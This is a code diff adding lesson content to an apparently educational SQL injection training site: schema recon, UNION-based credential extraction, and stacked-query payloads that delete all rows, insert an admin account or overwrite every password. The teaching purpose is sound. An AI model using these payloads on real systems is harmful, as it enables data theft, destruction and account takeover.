@@ -262,10 +262,200 @@ VALUES ('bob', 'x'); INSERT INTO users VALUES
         ],
       },
       {
+        type: "code",
+        heading: "Step 0: Map the database before you inject",
+        language: "sql",
+        filename: "recon.sql",
+        code: `-- List every table the database knows about
+SHOW TABLES;
+-- result: products | users | orders | ...
+
+-- Inspect a table's columns by fetching one row
+SELECT * FROM users LIMIT 1;
+-- result: id=1, username=admin, password=..., role=admin
+
+-- SQL-standard alternative (works on most databases)
+SELECT TABLE_NAME  FROM INFORMATION_SCHEMA.TABLES;
+SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
+  WHERE TABLE_NAME = 'users';`,
+      },
+      {
         type: "cta",
         heading: "Ready to practice?",
-        body: "You'll start with a classic SQLi login bypass. Your goal is to log in as the admin without knowing the password.",
+        body: "You'll start with a classic SQLi login bypass. Use the SQL Terminal in the challenge to explore the database first — then inject through the login form.",
       },
     ],
+    bridgeLectures: {
+      "union-recon": {
+        title: "UNION Injection & Schema Discovery",
+        sections: [
+          {
+            type: "intro",
+            heading: "Reading data you were never meant to see",
+            body: "You already know how to break out of a SQL string. The next step is to read data from tables the application never intended to expose. That requires two things: knowing what tables and columns exist (recon), and understanding how UNION SELECT appends a second query's rows onto the first.",
+          },
+          {
+            type: "code",
+            heading: "Phase 1 — Discover the schema",
+            language: "sql",
+            filename: "recon.sql",
+            code: `-- List all tables in the database
+SHOW TABLES;
+-- result: books, members
+
+-- See a table's column names by fetching one row
+SELECT * FROM members LIMIT 1;
+-- result: id | email | membership_key
+
+-- Standard SQL alternative
+SELECT TABLE_NAME  FROM INFORMATION_SCHEMA.TABLES;
+SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
+  WHERE TABLE_NAME = 'members';`,
+          },
+          {
+            type: "injection",
+            heading: "Phase 2 — Count the columns",
+            before: {
+              label: "Original query (3 columns)",
+              code: `SELECT id, title, author
+FROM books
+WHERE genre = 'Fiction'`,
+              highlight: "id, title, author",
+              caption: "The app returns 3 columns. Your UNION must return exactly 3 — any mismatch is an error.",
+            },
+            after: {
+              label: "Probe with ORDER BY",
+              code: `' ORDER BY 3 --   ← no error (3 cols exist)
+' ORDER BY 4 --   ← error! (col 4 doesn't exist)
+
+' UNION SELECT 1,2,3 --
+-- appends a row: 1 | 2 | 3
+-- confirms positions`,
+              highlight: "' ORDER BY 4 --   ← error!",
+              caption: "Increment N in ORDER BY until you get an error. The last number that worked is the column count.",
+            },
+          },
+          {
+            type: "code",
+            heading: "Phase 3 — The UNION rules",
+            language: "sql",
+            filename: "union-rules.sql",
+            code: `-- Rule 1: same number of columns
+SELECT id, title, author FROM books ...
+UNION
+SELECT id, email, membership_key FROM members
+--     ↑    ↑          ↑
+--     3    columns    match ✓
+
+-- Rule 2: column positions map left-to-right
+-- The id slot of books shows the id slot of members.
+-- Use filler values (1, NULL, 'x') for slots you don't care about.
+
+-- Rule 3: comment out the remainder of the original query
+' UNION SELECT 1, email, membership_key FROM members --
+--                                                   ^^
+--                           kills the trailing ' from the WHERE template`,
+          },
+          {
+            type: "injection",
+            heading: "Putting it together",
+            before: {
+              label: "Vulnerable catalogue query",
+              code: `SELECT id, title, author
+FROM books
+WHERE genre = '{input}'`,
+              highlight: "{input}",
+              caption: "Three columns. Input lands inside single quotes in the WHERE clause — a quote breaks out of the string.",
+            },
+            after: {
+              label: "After UNION injection",
+              code: `SELECT id, title, author FROM books
+WHERE genre = ''
+UNION SELECT 1, email, membership_key
+FROM members --'`,
+              highlight: "UNION SELECT 1, email, membership_key\nFROM members",
+              caption: "The original SELECT returns book rows. The injected UNION appends every member row — private credentials appear alongside the catalogue results.",
+            },
+          },
+          {
+            type: "cta",
+            heading: "Ready for the next challenge?",
+            body: "The portal you're about to face has more than one table. Use the SQL Terminal to map the schema, count the columns the query returns, then craft a UNION SELECT through the vulnerable input to surface the hidden data.",
+            challengeIndex: 1,
+            buttonLabel: "Go to Challenge 2 →",
+          },
+        ],
+      },
+      "stacked-queries": {
+        title: "Stacked Queries",
+        sections: [
+          {
+            type: "intro",
+            heading: "Chaining a second statement",
+            body: "Every injection so far modified the shape of one SQL statement — adding conditions, appending UNION rows. A semicolon goes further: it ends the current statement entirely and lets you write a second, completely independent command. The database runs both in sequence. That second command can be anything: DELETE, INSERT, UPDATE, DROP — whatever the database user is allowed to execute.",
+          },
+          {
+            type: "injection",
+            heading: "How the semicolon creates a second statement",
+            before: {
+              label: "Original filter query",
+              code: `SELECT id, subject, priority
+FROM tickets
+WHERE priority = '{input}'`,
+              highlight: "{input}",
+              caption: "Input lands inside single quotes. A quote alone breaks the string — but a semicolon ends the statement.",
+            },
+            after: {
+              label: "After stacked injection",
+              code: `SELECT id, subject, priority FROM tickets
+WHERE priority = ''
+;
+DELETE FROM tickets WHERE 1=1
+--'`,
+              highlight: "DELETE FROM tickets WHERE 1=1",
+              caption: "Statement 1 (SELECT) returns nothing — priority = '' matches no rows. Statement 2 (DELETE) runs independently and wipes every ticket. The -- comments out the leftover quote.",
+            },
+          },
+          {
+            type: "code",
+            heading: "Why WHERE 1=1 wipes everything",
+            language: "sql",
+            filename: "delete.sql",
+            code: `-- 1=1 is always true — it matches every row in the table
+DELETE FROM tickets WHERE 1=1;
+-- equivalent to: DELETE FROM tickets;
+
+-- Compare with a targeted delete:
+DELETE FROM tickets WHERE priority = 'Low';
+-- only removes low-priority tickets
+
+-- You can also use stacked queries to escalate privileges:
+'; INSERT INTO accounts (username, password, role)
+   VALUES ('hacker', 'pw', 'admin') --
+
+-- or to silently overwrite data:
+'; UPDATE accounts SET password = 'owned' WHERE 1=1 --`,
+          },
+          {
+            type: "flow",
+            heading: "The stacked query attack flow",
+            steps: [
+              { icon: "🔍", label: "Find the field",   detail: "Any input that lands in a WHERE clause without parameterization" },
+              { icon: "✂️",  label: "Close the string", detail: "A single quote ' ends the current string value" },
+              { icon: "⛓️",  label: "Chain with ;",     detail: "Semicolon terminates statement 1 and opens statement 2" },
+              { icon: "💥",  label: "Write statement 2", detail: "DELETE, INSERT, UPDATE, DROP — any valid SQL the DB user can run" },
+              { icon: "💬",  label: "Comment the tail",  detail: "-- silences the leftover quote from the original template" },
+            ],
+          },
+          {
+            type: "cta",
+            heading: "Ready for the next challenge?",
+            body: "The portal ahead filters records by a field value — your input lands directly in the WHERE clause. Use the SQL Terminal to understand what's stored, then chain a second statement through the vulnerable input to cause a destructive change.",
+            challengeIndex: 2,
+            buttonLabel: "Go to Challenge 3 →",
+          },
+        ],
+      },
+    },
   },
 };
